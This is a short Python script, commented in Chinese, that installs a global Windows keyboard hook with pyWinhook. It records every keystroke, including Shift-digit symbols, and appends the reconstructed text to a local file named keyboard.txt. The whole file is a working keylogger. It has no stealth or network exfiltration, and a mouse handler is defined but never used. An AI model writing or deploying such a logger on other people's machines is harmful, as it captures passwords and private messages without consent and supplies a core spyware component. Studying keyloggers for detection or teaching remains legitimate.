import pyWinhook
import pythoncom
import time
from datetime import datetime

end_time = time.time()
flag = 0


# 监听到鼠标事件调用
def onMouseEvent(event):
    """

    Args:
        event: 鼠标事件

    Returns:

    """
    if event.MessageName != "mouse move":  # 因为鼠标一动就会有很多mouse move，所以把这个过滤下
        print(event.MessageName)
    return True  # 为True才会正常调用，如果为False的话，此次事件被拦截


# 监听到键盘事件调用
def onKeyboardEvent(event):
    """

    Args:
        event: 键盘输入的事件

    Returns:
        若输出为False,则销毁事件
    """
    global flag
    global end_time
    # print("Key:", event.Key)
    # print("KeyID:", event.KeyID)
    candi = str(event.Key)
    print(candi)
    if candi.isdigit() or candi.isalpha() or candi.isspace():
        with open("keyboard.txt", 'a+') as f:
            if candi.isupper():
                f.write(candi.lower())
            elif candi == 'Space':
                f.write(" ")
            elif candi == 'Return':
                f.write('\n')
            elif candi.isdigit():
                if flag == 1:
                    '''and time.time() - end_time <= 1'''
                    chart = ")!@#$%^&*("
                    f.write(chart[int(candi)])
                else:
                    f.write(candi)
            elif candi == 'Lshift' or candi == 'Rshift':
                flag = 1
                end_time = time.time()

    return True


def onKeyboardEvent2(event):
    """

    Args:
        event: 键盘输入的事件

    Returns:
        若输出为False,则销毁事件
    """
    global flag
    global end_time
    # print("Key:", event.Key)
    # print("KeyID:", event.KeyID)
    candi = str(event.Key)
    print(candi)
    if candi.isdigit() or candi.isalpha() or candi.isspace():
        with open("keyboard.txt", 'a+') as f:
            if candi == 'Lshift' or candi == 'Rshift':
                print('UPUPUP!')
                flag = 0
                end_time = time.time()

    return True


def main():
    """

    主函数，负责监视键盘的输入，并写入txt中
    Returns:

    """
    # 创建管理器
    hm = pyWinhook.HookManager()
    # 监听键盘
    hm.KeyDown = onKeyboardEvent
    hm.KeyUp = onKeyboardEvent2
    hm.HookKeyboard()
    # 循环监听
    pythoncom.PumpMessages()


if __name__ == "__main__":
    with open("keyboard.txt", "w") as f:
        f.write("")
    main()
